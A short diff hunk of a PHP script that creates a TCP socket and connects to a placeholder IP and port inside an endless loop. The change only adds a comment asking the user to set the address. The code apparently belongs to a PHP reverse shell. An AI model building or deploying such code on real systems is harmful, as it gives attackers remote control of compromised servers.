@@ -26,7 +26,7 @@ function base64_handler($text, $encode=false, $decode=false)
 }
 
 $rev_socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-$connect = socket_connect($rev_socket, 'IP', PORT);
+$connect = socket_connect($rev_socket, 'IP', PORT); // Set IP and port on this line.
 
 while (true)
 {
